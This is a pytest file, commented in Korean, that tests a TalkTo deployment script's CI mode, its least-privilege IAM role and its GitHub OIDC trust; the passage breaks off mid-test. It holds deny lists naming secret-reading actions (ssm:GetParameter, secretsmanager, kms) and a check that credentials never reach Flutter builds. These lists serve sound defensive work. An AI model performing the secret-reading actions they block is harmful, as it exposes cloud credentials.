"""GitHub 배포 버튼(deploy/aws/ci/, ci.yaml)과 deploy.py 의 CI 모드(TALKTO_CI=1).

CI 는 코드만 올린다: 로컬 .env·비밀값·운영 설정을 건드리지 않고, 역할(ci.yaml)이 허락한 AWS 호출만
한다. 돌고 있는 만들기 작업이 있으면 서버를 바꾸지 않는다(force 면 그대로).
AWS·서버·Flutter 는 가짜로 두고, 실제로는 아무것도 부르지 않는다.
"""

import base64
import importlib.util
import io
import json
import shutil
import subprocess
import sys
import tarfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from types import SimpleNamespace

import pytest
from botocore.exceptions import ClientError

yaml = pytest.importorskip("yaml")

ROOT = Path(__file__).resolve().parents[1]
AWS_DIR = ROOT / "deploy" / "aws"
OUT = {
    "SiteUrl": "https://app.example.test",
    "CloudFrontUrl": "https://d111.cloudfront.net",
    "ArtifactBucket": "talkto-deploy-111122223333",
    "WebBucket": "talkto-web-111122223333",
    "MediaBucket": "talkto-media-111122223333",
    "DistributionId": "E2EXAMPLE",
    "InstanceId": "i-0abc",
    "DatabaseEndpoint": "db.internal",
}
HOOK = "https://discord.com/api/webhooks/123/secret-token-value"
# MediLux-TalkTo 의 공개 조직 번호. 레포 번호는 가짜.
IDS = {"GitHubOrgId": "274191021", "GitHubRepoId": "987654321"}
SUB = "repo:MediLux-TalkTo@274191021/talkto-deploy@987654321:ref:refs/heads/main"


def _load():
    spec = importlib.util.spec_from_file_location("talkto_deploy_ci", AWS_DIR / "deploy.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


deploy = _load()


class _CfnLoader(yaml.SafeLoader):
    """!Sub·!If·!Ref 같은 CloudFormation 태그를 {'!Sub': 값} 으로 읽는다."""


def _cfn_tag(loader, suffix, node):
    if isinstance(node, yaml.ScalarNode):
        value = loader.construct_scalar(node)
    elif isinstance(node, yaml.SequenceNode):
        value = loader.construct_sequence(node, deep=True)
    else:
        value = loader.construct_mapping(node, deep=True)
    return {"!" + suffix: value}


_CfnLoader.add_multi_constructor("!", _cfn_tag)


def _ci_template() -> dict:
    return yaml.load((AWS_DIR / "ci.yaml").read_text(encoding="utf-8"), Loader=_CfnLoader)


def _workflow() -> dict:
    return yaml.safe_load((AWS_DIR / "ci" / "deploy.yml").read_text(encoding="utf-8"))


def _as_list(value) -> list:
    return value if isinstance(value, list) else [value]


# ── 가짜 AWS ────────────────────────────────────────────
class FakeClient:
    """부른 것(서비스, API, 인자)을 기록한다. 모르는 API 는 실패시킨다(몰래 부르는 것 막기)."""

    KNOWN = {
        "sts": {"get_caller_identity"},
        "cloudformation": {"describe_stacks"},
        "s3": {"put_object", "upload_file", "delete_objects", "get_paginator"},
        "cloudfront": {"create_invalidation"},
        "ssm": {"describe_instance_information", "send_command", "get_command_invocation"},
    }

    def __init__(self, name: str, aws: "FakeAws") -> None:
        self.name = name
        self.aws = aws

    def __getattr__(self, op: str):
        if op not in self.KNOWN.get(self.name, set()):
            raise AssertionError(f"CI 에서 부르면 안 되는 AWS 호출: {self.name}.{op}")

        def call(*args, **kw):
            if op == "get_paginator":
                return FakePaginator(self.aws, args[0])
            self.aws.calls.append((self.name, op, args, kw))
            return self.aws.reply(self.name, op, args, kw)

        return call


class FakePaginator:
    def __init__(self, aws: "FakeAws", op: str) -> None:
        self.aws = aws
        self.op = op

    def paginate(self, **kw):
        self.aws.calls.append(("s3", self.op, (), kw))
        prefix = kw.get("Prefix", "")
        return [{"Contents": [{"Key": prefix + "old-file.js"}]}]


class FakeAws:
    def __init__(self, jobs_output: str = "TALKTO_JOBS {}") -> None:
        self.region = "ap-northeast-2"
        self.calls: list[tuple] = []
        self.commands: list[list[str]] = []
        self.jobs_output = jobs_output

    def client(self, name: str) -> FakeClient:
        return FakeClient(name, self)

    def reply(self, service: str, op: str, args: tuple, kw: dict):
        if (service, op) == ("sts", "get_caller_identity"):
            return {"Account": "111122223333"}
        if (service, op) == ("cloudformation", "describe_stacks"):
            outputs = [{"OutputKey": k, "OutputValue": v} for k, v in OUT.items()]
            return {"Stacks": [{"StackStatus": "UPDATE_COMPLETE", "Outputs": outputs}]}
        if (service, op) == ("ssm", "describe_instance_information"):
            return {"InstanceInformationList": [{"PingStatus": "Online"}]}
        if (service, op) == ("ssm", "send_command"):
            self.commands.append(kw["Parameters"]["commands"])
            return {"Command": {"CommandId": f"cmd-{len(self.commands)}"}}
        if (service, op) == ("ssm", "get_command_invocation"):
            last = "\n".join(self.commands[-1])
            out = self.jobs_output if "TALKTO_JOBS" in last else "배포 완료: tag"
            return {"Status": "Success", "StandardOutputContent": out}
        return {}


def _forbid(name: str):
    def boom(*args, **kw):
        raise AssertionError(f"CI 에서 {name} 를 부르면 안 돼요")

    return boom


@pytest.fixture
def ci(monkeypatch, tmp_path):
    """CI 모드. 로컬 .env·비밀값·운영 설정에 손대는 함수는 부르면 실패한다."""
    monkeypatch.setenv("TALKTO_CI", "1")
    monkeypatch.delenv("TALKTO_FORCE", raising=False)
    for name in (
        "read_env",
        "generated_secrets",
        "put_param",
        "get_param",
        "legacy_secret",
        "retire_legacy_secrets",
        "backend_env",
        "ai_env",
        "step_infra",
        "step_domain",
    ):
        monkeypatch.setattr(deploy, name, _forbid(name))
    monkeypatch.setattr(deploy.time, "sleep", lambda s: None)
    monkeypatch.setattr(deploy, "smoke", lambda out: True)
    packed: list[str] = []

    def fake_pack(src, include):
        packed.append(Path(src).name)
        return b"bundle"

    monkeypatch.setattr(deploy, "pack", fake_pack)
    # 웹·랜딩은 임시 FE 폴더로(진짜 FE 빌드 폴더를 건드리지 않게). Flutter 빌드는 가짜.
    fe = tmp_path / "FE"
    (fe / "landing").mkdir(parents=True)
    (fe / "landing" / "index.html").write_text("<h1>TalkTo</h1>", encoding="utf-8")
    monkeypatch.setattr(deploy, "FE", fe)
    monkeypatch.setattr(deploy, "WEB_BUILD", fe / "build" / "web-prod")
    monkeypatch.setattr(deploy, "LANDING", fe / "landing")
    real_run = subprocess.run
    holder = {}

    def fake_run(args, *a, **kw):
        if args and str(args[0]).startswith("flutter"):
            holder["flutter_env"] = kw.get("env")
            deploy.WEB_BUILD.mkdir(parents=True, exist_ok=True)
            (deploy.WEB_BUILD / "index.html").write_text("<html></html>", encoding="utf-8")
            (deploy.WEB_BUILD / "main.dart.js").write_text("//", encoding="utf-8")
            return subprocess.CompletedProcess(args, 0, "", "")
        return real_run(args, *a, **kw)

    monkeypatch.setattr(deploy.subprocess, "run", fake_run)

    def make_aws():
        holder["aws"] = FakeAws(holder.get("jobs_output", "TALKTO_JOBS {}"))
        return holder["aws"]

    monkeypatch.setattr(deploy, "Aws", make_aws)
    holder["packed"] = packed
    return holder


# 가짜 호출 → 역할(ci.yaml)에 있어야 하는 IAM 권한. None 은 권한이 필요 없다.
IAM_ACTION = {
    ("sts", "get_caller_identity"): None,
    ("cloudformation", "describe_stacks"): "cloudformation:DescribeStacks",
    ("s3", "put_object"): "s3:PutObject",
    ("s3", "upload_file"): "s3:PutObject",
    ("s3", "list_objects_v2"): "s3:ListBucket",
    ("s3", "delete_objects"): "s3:DeleteObject",
    ("cloudfront", "create_invalidation"): "cloudfront:CreateInvalidation",
    ("ssm", "describe_instance_information"): "ssm:DescribeInstanceInformation",
    ("ssm", "send_command"): "ssm:SendCommand",
    ("ssm", "get_command_invocation"): "ssm:GetCommandInvocation",
}


def _allowed_actions() -> set[str]:
    role = _ci_template()["Resources"]["DeployRole"]["Properties"]
    statements = role["Policies"][0]["PolicyDocument"]["Statement"]
    return {a for s in statements if s["Effect"] == "Allow" for a in _as_list(s["Action"])}


@pytest.mark.parametrize("step", deploy.CI_STEPS)
def test_ci_ships_code_only_with_calls_the_role_allows(ci, step):
    summary = deploy.run(step)
    aws = ci["aws"]
    assert summary
    allowed = _allowed_actions()
    for service, op, args, kw in aws.calls:
        action = IAM_ACTION[(service, op)]
        assert action is None or action in allowed, f"{service}.{op} → {action} 권한이 없어요"
        # 버킷·배포·서버도 역할이 허락한 것만
        if service == "s3":
            bucket = kw.get("Bucket") or args[1]
            want = OUT["ArtifactBucket"] if op == "put_object" else OUT["WebBucket"]
            assert bucket == want
        if service == "cloudfront":
            assert kw["DistributionId"] == OUT["DistributionId"]
        if (service, op) == ("ssm", "send_command"):
            assert kw["InstanceIds"] == [OUT["InstanceId"]]
            assert kw["DocumentName"] == "AWS-RunShellScript"
    ops = [(s, o) for s, o, _, _ in aws.calls]
    if step in ("server", "app"):
        assert ci["packed"] == ["talkto_api_server", "TalkTo_PersonaAI_AI"]
        # 작업 확인(TALKTO_JOBS)이 소스 올리기·빌드보다 먼저
        assert "TALKTO_JOBS" in "\n".join(aws.commands[0])
        assert any("run.sh" in line for line in aws.commands[-1])
        first_upload = ops.index(("s3", "put_object"))
        first_command = ops.index(("ssm", "send_command"))
        assert first_command < first_upload
    else:
        assert ci["packed"] == []
        assert ("ssm", "send_command") not in ops
    if step in ("web", "app"):
        assert ("s3", "upload_file") in ops
    if step == "landing":
        keys = [args[2] for s, o, args, _ in aws.calls if (s, o) == ("s3", "upload_file")]
        assert keys == ["_landing/index.html"]


def test_flutter_build_gets_no_aws_or_discord_values(ci, monkeypatch):
    """flutter·pub 패키지는 남이 만든 코드다. AWS 임시 열쇠·디스코드 주소·OIDC 토큰을 새로 받는
    값은 넘기지 않는다(그 값으로 배포 역할을 다시 받을 수 있다)."""
    for name in (
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "AWS_REGION",
        "DISCORD_DEPLOY_WEBHOOK_URL",
        "ACTIONS_ID_TOKEN_REQUEST_URL",
        "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
    ):
        monkeypatch.setenv(name, "x")
    monkeypatch.setenv("PUB_CACHE", "pub-cache-dir")
    deploy.run("web")
    env = ci["flutter_env"]
    assert env is not None
    dropped = ("AWS_", "DISCORD_", "ACTIONS_ID_TOKEN_REQUEST_")
    assert [k for k in env if k.upper().startswith(dropped)] == []
    assert env["PUB_CACHE"] == "pub-cache-dir" and env.get("PATH")


@pytest.mark.parametrize("step", ["infra", "domain", "all", "ci", "status"])
def test_ci_refuses_founder_only_steps(ci, step, monkeypatch):
    sent = []
    monkeypatch.setattr(deploy, "tell_discord", sent.append)
    monkeypatch.setattr(deploy.sys, "argv", ["deploy.py", step])
    with pytest.raises(SystemExit) as error:
        deploy.main()
    assert "GitHub 배포에서 돌릴 수 없어요" in str(error.value)
    assert sent == []  # 디스코드에 '시작'도 보내지 않는다
    assert "aws" not in ci  # AWS 에 붙지도 않는다
    with pytest.raises(SystemExit):
        deploy.run(step)
    assert "aws" not in ci


def test_unknown_step_shows_usage(monkeypatch):
    monkeypatch.delenv("TALKTO_CI", raising=False)
    with pytest.raises(SystemExit) as error:
        deploy.check_step("everything")
    assert "deploy.py app" in str(error.value)


# ── 돌고 있는 작업 확인 ─────────────────────────────────
def _jobs_aws(monkeypatch, output: str) -> list[list[str]]:
    sent: list[list[str]] = []

    def fake_run_on_server(aws, instance_id, commands, timeout=3600):
        sent.append(commands)
        return output

    monkeypatch.setattr(deploy, "run_on_server", fake_run_on_server)
    return sent


def test_running_jobs_stop_the_swap_unless_forced(monkeypatch):
    monkeypatch.delenv("TALKTO_FORCE", raising=False)
    monkeypatch.setenv("TALKTO_CI", "1")
    sent = _jobs_aws(monkeypatch, 'noise\nTALKTO_JOBS {"VOICE": 1, "TRANSCRIBE": 2}\n')
    with pytest.raises(SystemExit) as error:
        deploy.guard_running_jobs(FakeAws(), "i-0abc")
    message = str(error.value)
    assert "목소리 만들기(VOICE) 1개" in message and "받아쓰기(TRANSCRIBE) 2개" in message
    assert "force" in message
    # 백엔드 컨테이너 안에서 RUNNING 을 센다. 스크립트는 base64 로 보낸다(따옴표·한글 걱정 없이).
    joined = "\n".join(sent[0])
    assert "docker exec -i talkto-backend python -" in joined
    assert "RUNNING" in deploy.JOBS_CHECK and deploy.JOBS_CHECK.isascii()
    monkeypatch.setenv("TALKTO_FORCE", "1")
    deploy.guard_running_jobs(FakeAws(), "i-0abc")  # force 면 그대로 간다


@pytest.mark.parametrize(
    ("output", "passes"),
    [
        ("TALKTO_JOBS {}", True),
        ('TALKTO_JOBS {"BUILD": 0}', True),
        ("TALKTO_JOBS none", True),  # 백엔드가 꺼져 있으면 끊길 작업이 없다
        ("Traceback (most recent call last):\n  boom", False),  # 못 세면 멈춘다
        ("TALKTO_JOBS {not json", False),
    ],
)
def test_job_check_outputs(monkeypatch, output, passes):
    monkeypatch.delenv("TALKTO_FORCE", raising=False)
    monkeypatch.delenv("TALKTO_CI", raising=False)
    _jobs_aws(monkeypatch, output)
    if passes:
        deploy.guard_running_jobs(FakeAws(), "i-0abc")
    else:
        with pytest.raises(SystemExit) as error:
            deploy.guard_running_jobs(FakeAws(), "i-0abc")
        assert "TALKTO_FORCE=1" in str(error.value)
        monkeypatch.setenv("TALKTO_FORCE", "1")
        deploy.guard_running_jobs(FakeAws(), "i-0abc")


def test_local_server_checks_jobs_before_touching_anything(monkeypatch):
    """로컬(대표님)도 같은 확인을 한다. 막히면 설정도 소스도 올리지 않는다."""
    monkeypatch.delenv("TALKTO_CI", raising=False)
    monkeypatch.delenv("TALKTO_FORCE", raising=False)
    monkeypatch.setattr(deploy, "backend_env", lambda out, gen, region: {"A": "1"})
    monkeypatch.setattr(deploy, "ai_env", lambda gen: {"B": "2"})
    params = []
    monkeypatch.setattr(deploy, "put_param", lambda aws, name, value: params.append(name))
    retired = []
    monkeypatch.setattr(deploy, "retire_legacy_secrets", lambda aws: retired.append(1))
    monkeypatch.setattr(deploy, "pack", lambda src, include: b"bundle")
    monkeypatch.setattr(deploy, "wait_ssm", lambda aws, instance_id: None)
    _jobs_aws(monkeypatch, 'TALKTO_JOBS {"ANALYZE": 1}')
    aws = FakeAws()
    with pytest.raises(SystemExit):
        deploy.step_server(aws, OUT, {"DB_PASSWORD": "x"})
    assert params == [] and retired == [] and aws.calls == []

    # 작업이 없으면 예전처럼 운영 설정을 올리고 예전 비밀값을 정리한다
    _jobs_aws(monkeypatch, "TALKTO_JOBS {}")
    deploy.step_server(aws, OUT, {"DB_PASSWORD": "x"})
    assert params == ["backend-env", "ai-env"] and retired == [1]
    assert ("s3", "put_object") in [(s, o) for s, o, _, _ in aws.calls]


# ── 디스코드 ────────────────────────────────────────────
def test_discord_in_ci_reads_the_github_secret_and_never_prints_it(monkeypatch, capsys):
    monkeypatch.setenv("TALKTO_CI", "1")
    monkeypatch.setenv("DISCORD_DEPLOY_WEBHOOK_URL", HOOK + "\n")
    monkeypatch.setattr(deploy, "read_env", _forbid("read_env"))
    seen = []

    def fake_urlopen(req, timeout=None):
        seen.append(req.full_url)
        raise OSError(f"cannot reach {req.full_url}")

    monkeypatch.setattr(deploy.urllib.request, "urlopen", fake_urlopen)
    deploy.tell_discord("🚀 배포 시작 · server")
    assert seen == [HOOK]
    printed = capsys.readouterr()
    assert "secret-token-value" not in printed.out + printed.err
    assert "디스코드 알림을 보내지 못했어요" in printed.out


def test_discord_locally_reads_the_backend_env(monkeypatch):
    monkeypatch.delenv("TALKTO_CI", raising=False)
    monkeypatch.setenv("DISCORD_DEPLOY_WEBHOOK_URL", "https://discord.com/api/webhooks/env/no")
    monkeypatch.setattr(deploy, "read_env", lambda path: {"DISCORD_DEPLOY_WEBHOOK_URL": HOOK})
    seen = []

    class _Resp:
        def close(self):
            pass

    monkeypatch.setattr(
        deploy.urllib.request, "urlopen", lambda req, timeout=None: seen.append(req) or _Resp()
    )
    deploy.tell_discord("x")
    assert [r.full_url for r in seen] == [HOOK]


@pytest.mark.parametrize("in_ci", [True, False])
def test_messages_say_who_deployed_in_ci(monkeypatch, in_ci):
    if in_ci:
        monkeypatch.setenv("TALKTO_CI", "1")
    else:
        monkeypatch.delenv("TALKTO_CI", raising=False)
    monkeypatch.setenv("GITHUB_ACTOR", "Loda1002")
    monkeypatch.delenv("GITHUB_TRIGGERING_ACTOR", raising=False)
    sent = []
    monkeypatch.setattr(deploy, "tell_discord", sent.append)
    monkeypatch.setattr(deploy, "commits", lambda: "BE abc")
    monkeypatch.setattr(deploy.sys, "argv", ["deploy.py", "landing"])
    monkeypatch.setattr(deploy, "run", lambda step: "랜딩 3개 파일")
    deploy.main()

    def failing(step):
        raise SystemExit("빌드 실패")

    monkeypatch.setattr(deploy, "run", failing)
    with pytest.raises(SystemExit):
        deploy.main()
    assert len(sent) == 4
    for text in sent:
        assert ("GitHub Loda1002" in text) is in_ci
        assert "GitHub" not in text or in_ci


@pytest.mark.parametrize(
    ("triggering", "want"),
    [
        ("alexamy", " · GitHub alexamy"),  # 다시 돌린 사람
        ("", " · GitHub Loda1002"),  # 없으면 GITHUB_ACTOR
        ("**@everyone**", " · GitHub everyone"),  # 아이디에 쓸 수 없는 글자는 뺀다
    ],
)
def test_deployer_prefers_who_reran(monkeypatch, triggering, want):
    """'다시 돌리기'는 GITHUB_ACTOR 가 처음 누른 사람으로 남는다. 누른 사람을 적는다."""
    monkeypatch.setenv("TALKTO_CI", "1")
    monkeypatch.setenv("GITHUB_ACTOR", "Loda1002")
    monkeypatch.setenv("GITHUB_TRIGGERING_ACTOR", triggering)
    assert deploy.deployer() == want


# ── ci.yaml (역할) ──────────────────────────────────────
FORBIDDEN_PREFIXES = (
    "ssm:GetParameter",
    "ssm:PutParameter",
    "ssm:StartSession",
    "kms:",
    "secretsmanager:",
    "iam:",
    "sts:AssumeRole",
    "cloudformation:Create",
    "cloudformation:Update",
    "cloudformation:Delete",
    "cloudformation:Execute",
    "ec2:",
    "rds:",
    "s3:GetObject",
)


def test_role_allows_only_code_deploy_actions():
    allowed = _allowed_actions()
    assert allowed == {
        "cloudformation:DescribeStacks",
        "s3:PutObject",
        "s3:DeleteObject",
        "s3:AbortMultipartUpload",
        "s3:ListBucket",
        "cloudfront:CreateInvalidation",
        "ssm:SendCommand",
        "ssm:GetCommandInvocation",
        "ssm:DescribeInstanceInformation",
    }
    for action in allowed:
        assert "*" not in action
        assert not action.startswith(FORBIDDEN_PREFIXES), action
    # 모든 CI 호출이 역할 안에 있다
    assert {a for a in IAM_ACTION.values() if a} <= allowed
    role = _ci_template()["Resources"]["DeployRole"]["Properties"]
    statements = role["Policies"][0]["PolicyDocument"]["Statement"]
    by_sid = {s["Sid"]: s for s in statements}
    # 서버 명령은 그 서버와 셸 문서에만, 결과 보기만 '*'
    run = [r["!Sub"] for r in by_sid["RunOnServer"]["Resource"]]
    assert run == [
        "arn:${AWS::Partition}:ec2:${AWS::Region}:${AWS::AccountId}:instance/${InstanceId}",
        "arn:${AWS::Partition}:ssm:${AWS::Region}::document/AWS-RunShellScript",
    ]
    stars = {s["Sid"] for s in statements if s["Effect"] == "Allow" and s["Resource"] == "*"}
    assert stars == {"ReadCommandResults"}
    assert by_sid["ReadMainStackOutputs"]["Resource"]["!Sub"].endswith(":stack/${MainStackName}/*")
    # 비밀값·인프라는 명시적으로 막는다
    denied = set(by_sid["NeverSecretsOrInfra"]["Action"])
    assert {"ssm:GetParameter*", "secretsmanager:*", "kms:*", "iam:*"} <= denied
    assert by_sid["NeverSecretsOrInfra"]["Effect"] == "Deny"


def test_role_trusts_only_the_deploy_repo_main_branch():
    tpl = _ci_template()
    params = tpl["Parameters"]
    assert {k: params[k]["Default"] for k in deploy.CI_GITHUB} == deploy.CI_GITHUB
    role = tpl["Resources"]["DeployRole"]["Properties"]
    assert role["RoleName"] == "talkto-github-deploy"
    assert role["MaxSessionDuration"] == 3600
    (trust,) = role["AssumeRolePolicyDocument"]["Statement"]
    assert trust["Effect"] == "Allow"
    assert trust["Action"] == "sts:AssumeRoleWithWebIdentity"
    assert set(trust["Condition"]) == {"StringEquals"}  # StringLike(와일드카드) 없이
    cond = trust["Condition"]["StringEquals"]
    # 2026-07-15 뒤에 만든 레포는 sub 에 조직·레포 번호가 붙는다(GitHub OIDC 문서의 immutable 형식).
    # 번호 없는 옛 모양이나 와일드카드는 두지 않는다.
    template = (
        "repo:${GitHubOrg}@${GitHubOrgId}/${GitHubRepo}@${GitHubRepoId}"
        ":ref:refs/heads/${GitHubBranch}"
    )
    assert cond == {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": {"!Sub": template},
    }
    for key in deploy.CI_GITHUB_IDS:
        assert params[key]["AllowedPattern"] == "^[0-9]+$"
        assert "Default" not in params[key]  # 늘 deploy.py 가 읽어 넣는다
    # 실제 값을 채우면 deploy.py 가 찍는 '받는 작업'과 글자까지 같다
    values = {**deploy.CI_GITHUB, **IDS}
    rendered = template
    for k, v in values.items():
        rendered = rendered.replace("${" + k + "}", v)
    assert rendered == SUB == deploy.ci_subject(IDS)
    assert "*" not in rendered and "?" not in rendered
    federated = trust["Principal"]["Federated"]["!If"]
    assert federated[0] == "MakeOidc" and federated[1] == {"!Ref": "GitHubOidc"}
    assert federated[2]["!Sub"].endswith(":oidc-provider/token.actions.githubusercontent.com")
    oidc = tpl["Resources"]["GitHubOidc"]
    assert oidc["Condition"] == "MakeOidc"
    assert oidc["Properties"]["Url"] == "https://token.actions.githubusercontent.com"
    assert oidc["Properties"]["ClientIdList"] == ["sts.amazonaws.com"]
    assert tpl["Outputs"]["RoleArn"]["Value"] == {"!GetAtt": "DeployRole.Arn"}


def test_ci_stack_keeps_an_oidc_provider_it_owns(monkeypatch):
    """계정에 OIDC 공급자가 없을 때만 만든다. 이 스택이 만든 것이면 계속 둔다(false 면 지워진다)."""
    aws = FakeAws()
    monkeypatch.setattr(deploy, "github_oidc_exists", lambda aws: False)
    assert deploy.ci_parameters(aws, OUT, None, IDS)["CreateOidcProvider"] == "true"
    monkeypatch.setattr(deploy, "github_oidc_exists", lambda aws: True)
    assert deploy.ci_parameters(aws, OUT, None, IDS)["CreateOidcProvider"] == "false"
    owns = {"Parameters": [{"ParameterKey": "CreateOidcProvider", "ParameterValue": "true"}]}
    params = deploy.ci_parameters(aws, OUT, owns, IDS)
    assert params["CreateOidcProvider"] == "true"
    assert {k: params[k] for k in deploy.CI_OUTPUTS} == {k: OUT[k] for k in deploy.CI_OUTPUTS}
    assert {k: params[k] for k in IDS} == IDS
    assert params["MainStackName"] == deploy.STACK
    assert set(params) == set(_ci_template()["Parameters"])


# ── 'ci' 단계: 레포 번호 읽기·역할 스택 ──────────────────
REPO_JSON = {
    "id": 987654321,
    "full_name": "MediLux-TalkTo/talkto-deploy",
    "private": True,
    "owner": {"id": 274191021, "login": "MediLux-TalkTo"},
    "description": "TalkTo 운영 배포 버튼",
}


@pytest.fixture
def gh(monkeypatch):
    """가짜 gh. reply 를 바꿔 결과를 정한다. 부른 명령을 기록한다."""
    for env in deploy.CI_GITHUB_IDS.values():
        monkeypatch.delenv(env, raising=False)
    state = {"reply": (0, json.dumps(REPO_JSON), ""), "calls": []}

    def fake_run(args, *a, **kw):
        state["calls"].append(list(args))
        if state["reply"] is OSError:
            raise FileNotFoundError("gh")
        code, out, err = state["reply"]
        return subprocess.CompletedProcess(args, code, out, err)

    monkeypatch.setattr(deploy.subprocess, "run", fake_run)
    return state


def test_github_ids_reads_the_repo_with_gh(gh):
    assert deploy.github_ids() == IDS
    assert gh["calls"] == [["gh", "api", "repos/MediLux-TalkTo/talkto-deploy"]]  # 읽기만


@pytest.mark.parametrize(
    ("reply", "says"),
    [
        ((1, '{"message":"Not Found"}', "gh: Not Found (HTTP 404)"), "레포가 아직 없어요"),
        ((1, "", "HTTP 401: Bad credentials"), "gh auth login"),
        (OSError, "GitHub CLI(gh)가 없어요"),
        ((0, json.dumps({**REPO_JSON, "private": False}), ""), "비공개여야 해요"),
        (
            (0, json.dumps({**REPO_JSON, "full_name": "MediLux-TalkTo/talkto-deploy-old"}), ""),
            "정확히",
        ),
        ((0, json.dumps({**REPO_JSON, "id": "12a"}), ""), "번호가 이상해요"),
        ((0, "not json", ""), "읽지 못했어요"),
    ],
)
def test_github_ids_refuses_when_the_repo_is_not_ready(gh, reply, says):
    gh["reply"] = reply
    with pytest.raises(SystemExit) as error:
        deploy.github_ids()
    assert says in str(error.value)


def test_github_ids_from_env_skips_gh(gh, monkeypatch):
    gh["reply"] = OSError
    monkeypatch.setenv("TALKTO_GITHUB_ORG_ID", IDS["GitHubOrgId"])
    monkeypatch.setenv("TALKTO_GITHUB_REPO_ID", IDS["GitHubRepoId"])
    assert deploy.github_ids() == IDS
    assert gh["calls"] == []
    for bad in ("12a", "١٢", "", " "):  # 숫자(0-9)만. 하나만 주어도 멈춘다.
        monkeypatch.setenv("TALKTO_GITHUB_REPO_ID", bad)
        with pytest.raises(SystemExit):
            deploy.github_ids()


ROLE_ARN = "arn:aws:iam::111122223333:role/talkto-github-deploy"


class FakeCiAws:
    """'ci' 단계용 가짜 AWS(CloudFormation·IAM). 스택 만들기·고치기를 기록한다."""

    def __init__(self, ci_stack: dict | None = None, describe_error: str | None = None) -> None:
        self.region = "ap-northeast-2"
        self.ci_stack = ci_stack
        self.describe_error = describe_error
        self.calls: list[tuple] = []

    def client(self, name: str):
        if name == "iam":
            return SimpleNamespace(
                list_open_id_connect_providers=lambda: {"OpenIDConnectProviderList": []}
            )
        assert name == "cloudformation", name
        return SimpleNamespace(
            describe_stacks=self.describe_stacks,
            create_stack=lambda **kw: self.write("create_stack", kw),
            update_stack=lambda **kw: self.write("update_stack", kw),
            get_waiter=lambda name: SimpleNamespace(wait=lambda **kw: None),
        )

    def describe_stacks(self, StackName):
        self.calls.append(("describe_stacks", StackName))
        if self.describe_error:
            raise ClientError(
                {"Error": {"Code": "Throttling", "Message": self.describe_error}}, "DescribeStacks"
            )
        if self.ci_stack is None:
            missing = f"Stack with id {StackName} does not exist"
            raise ClientError(
                {"Error": {"Code": "ValidationError", "Message": missing}}, "DescribeStacks"
            )
        return {"Stacks": [self.ci_stack]}

    def write(self, op: str, kw: dict) -> None:
        self.calls.append((op, kw))
        self.ci_stack = {
            "StackStatus": "CREATE_COMPLETE",
            "Parameters": kw["Parameters"],
            "Outputs": [{"OutputKey": "RoleArn", "OutputValue": ROLE_ARN}],
        }

    def params(self) -> dict[str, str]:
        (kw,) = [kw for op, kw in self.calls if op in ("create_stack", "update_stack")]
        return {p["ParameterKey"]: p["ParameterValue"] for p in kw["Parameters"]}


def test_step_ci_pins_the_role_to_the_repo_ids(gh, capsys):
    aws = FakeCiAws()
    assert deploy.step_ci(aws, OUT) == f"GitHub 배포 역할 {ROLE_ARN}"
    params = aws.params()
    assert {k: params[k] for k in IDS} == IDS
    assert params["CreateOidcProvider"] == "true"  # 계정에 아직 없다
    (create,) = [kw for op, kw in aws.calls if op == "create_stack"]
    assert create["Capabilities"] == ["CAPABILITY_NAMED_IAM"]
    printed = capsys.readouterr().out
    assert f"받는 작업: {SUB}" in printed and ROLE_ARN in printed


def test_step_ci_stops_before_aws_when_the_repo_is_missing(gh):
    gh["reply"] = (1, '{"message":"Not Found"}', "gh: Not Found (HTTP 404)")
    aws = FakeCiAws()
    with pytest.raises(SystemExit) as error:
        deploy.step_ci(aws, OUT)
    assert "레포가 아직 없어요" in str(error.value)
    assert aws.calls == []  # 역할을 만들기는커녕 스택도 안 본다


def _live(values: dict[str, str]) -> dict:
    return {
        "StackStatus": "UPDATE_COMPLETE",
        "Parameters": [{"ParameterKey": k, "ParameterValue": v} for k, v in values.items()],
    }


def test_refresh_ci_reuses_the_ids_in_the_role(gh, monkeypatch):
    """인프라가 서버를 바꾸면 역할을 고친다. 레포 번호는 지금 역할의 값을 쓴다(gh 없이)."""
    gh["reply"] = OSError
    live = {**{k: OUT[k] for k in deploy.CI_OUTPUTS}, **IDS, "CreateOidcProvider": "true"}
    live["InstanceId"] = "i-0old"
    aws = FakeCiAws(_live(live))
    deploy.refresh_ci(aws, OUT)
    params = aws.params()
    assert params["InstanceId"] == OUT["InstanceId"]
    assert {k: params[k] for k in IDS} == IDS
    assert params["CreateOidcProvider"] == "true"  # 이 스택이 만든 공급자는 계속 둔다
    assert gh["calls"] == []

    # 바뀐 게 없으면 아무것도 안 한다
    aws = FakeCiAws(_live({**live, "InstanceId": OUT["InstanceId"]}))
    deploy.refresh_ci(aws, OUT)
    assert [op for op, _ in aws.calls] == ["describe_stacks"]


def test_refresh_ci_never_stops_the_deploy(gh, capsys):
    """인프라는 이미 바뀐 뒤다. 역할 스택을 못 읽거나(일시 오류) 못 고쳐도 알리고 이어 간다."""
    deploy.refresh_ci(FakeCiAws(describe_error="Rate exceeded"), OUT)
    assert "GitHub 배포 역할을 확인하지 못했어요" in capsys.readouterr().out

    # 역할에 번호가 없고 gh 도 못 쓰면 → 경고만
    gh["reply"] = OSError
    live = {k: OUT[k] for k in deploy.CI_OUTPUTS} | {"InstanceId": "i-0old"}
    aws = FakeCiAws(_live(live))
    deploy.refresh_ci(aws, OUT)
    assert "못 고쳤어요" in capsys.readouterr().out
    assert [op for op, _ in aws.calls] == ["describe_stacks"]


# ── deploy.yml (배포 버튼) ──────────────────────────────
def test_workflow_shape():
    wf = _workflow()
    on = wf.get("on", wf.get(True))  # YAML 1.1 은 on 을 True 로 읽는다
    inputs = on["workflow_dispatch"]["inputs"]
    assert wf["name"] == "배포"
    assert inputs["target"]["type"] == "choice"
    assert inputs["target"]["options"] == list(deploy.CI_STEPS)
    assert inputs["target"]["default"] == "server"
    assert inputs["ref"]["default"] == "feat/persona-builder"
    assert inputs["force"]["type"] == "boolean" and inputs["force"]["default"] is False
    assert wf["concurrency"] == {"group": "talkto-prod-deploy", "cancel-in-progress": False}
    assert wf["permissions"] == {}
    (job,) = wf["jobs"].values()
    # environment 를 두면 OIDC sub 가 환경 꼴이 돼 main 브랜치 조건과 맞지 않는다. main 에서만 돈다
